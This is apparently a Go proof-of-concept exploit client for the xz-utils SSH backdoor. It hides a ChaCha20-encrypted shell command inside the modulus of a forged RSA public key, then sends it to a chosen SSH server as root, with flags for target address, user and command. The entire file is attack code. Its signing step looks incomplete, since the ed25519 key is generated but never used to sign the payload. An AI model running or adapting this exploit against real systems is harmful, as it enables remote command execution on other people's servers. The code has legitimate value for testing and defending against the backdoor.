package main

import (
	"bytes"
	"crypto/ed25519"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/ssh"
)

var (
	addr = flag.String("addr", "127.0.0.1:2222", "ssh server address")
	cmd  = flag.String("cmd", "id > /tmp/xz_pwned", "command to run via system()")
	user = flag.String("usr", "root", "user to connect with")
)

type xzPublicKey struct {
	modulus []byte
}

func (k *xzPublicKey) Type() string {
	return "ssh-rsa"
}

func (k *xzPublicKey) Marshal() []byte {
	e := new(big.Int).SetInt64(65537)
	wirekey := struct {
		Name string
		E    *big.Int
		N    *big.Int
	}{
		"ssh-rsa",
		e,
		new(big.Int).SetBytes(k.modulus),
	}
	return ssh.Marshal(wirekey)
}

func (k *xzPublicKey) Verify(data []byte, sig *ssh.Signature) error {
	return nil
}

type xzSigner struct {
	pub           *xzPublicKey
	encryptionKey []byte
}

func (s *xzSigner) PublicKey() ssh.PublicKey {
	return s.pub
}

func (s *xzSigner) Sign(rand io.Reader, data []byte) (*ssh.Signature, error) {
	return &ssh.Signature{Format: "ssh-rsa", Blob: []byte{0}}, nil
}

func decrypt(src, key, iv []byte, counter uint32) []byte {
	dst := make([]byte, len(src))
	c, err := chacha20.NewUnauthenticatedCipher(key, iv[4:16])
	if err != nil {
		log.Fatal(err)
	}
	c.SetCounter(counter)
	c.XORKeyStream(dst, src)
	return dst
}

func main() {
	flag.Parse()

	if len(*cmd) > 64 {
		log.Fatal("Command too long (max 64)")
	}

	var seed [32]byte
	sb, _ := new(big.Int).SetString("0", 10)
	sb.FillBytes(seed[:])

	signingKey := ed25519.NewKeyFromSeed(seed[:])
	encryptionKey := signingKey[32:]

	magic1 := uint32(0x1234)
	magic2 := uint32(0x5678)
	magic3 := uint64(0xfffffffff9d9ffa2)

	var hdr bytes.Buffer
	binary.Write(&hdr, binary.LittleEndian, magic1)
	binary.Write(&hdr, binary.LittleEndian, magic2)
	binary.Write(&hdr, binary.LittleEndian, magic3)

	var payload bytes.Buffer
	payload.Write([]byte{0, 0, 0, uint8(len(*cmd)), 0})
	payload.Write([]byte(*cmd))
	payload.Write([]byte{0})

	encryptedPayload := decrypt(payload.Bytes(), encryptionKey, hdr.Bytes(), magic1)

	var n_bytes bytes.Buffer
	n_bytes.Write(hdr.Bytes())
	n_bytes.Write(encryptedPayload)

	if n_bytes.Len() < 256 {
		n_bytes.Write(make([]byte, 256-n_bytes.Len()))
	}

	xz := &xzSigner{
		pub: &xzPublicKey{modulus: n_bytes.Bytes()},
	}

	config := &ssh.ClientConfig{
		User: *user,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(xz),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	fmt.Printf("[*] Connecting to %s with seed %s...\n", *addr, "0")
	client, err := ssh.Dial("tcp", *addr, config)
	if err != nil {
		fmt.Printf("[!] Dial finished: %v\n", err)
	} else {
		defer client.Close()
	}
}
